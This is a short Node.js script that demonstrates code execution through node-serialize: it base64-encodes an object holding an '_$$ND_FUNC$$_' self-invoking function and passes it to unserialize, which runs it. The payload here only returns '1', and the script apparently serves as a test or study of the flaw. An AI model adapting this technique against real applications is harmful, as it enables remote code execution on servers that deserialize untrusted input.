const serialize = require("node-serialize");


const obj = {
  a: `_$$ND_FUNC$$_function(){return '1'}()`
}

const payLoadStringified = JSON.stringify(obj)
const payloadB64 = encodeToBase64(payLoadStringified);
let result = unserializePayload(payloadB64);
console.log(result)


function unserializePayload(base64EncodedPayload) {
  const buffer = new Buffer(base64EncodedPayload, 'base64').toString();
  const json = serialize.unserialize(buffer);
  return json;
}

function encodeToBase64(str) {
  return Buffer.from(str).toString('base64');
}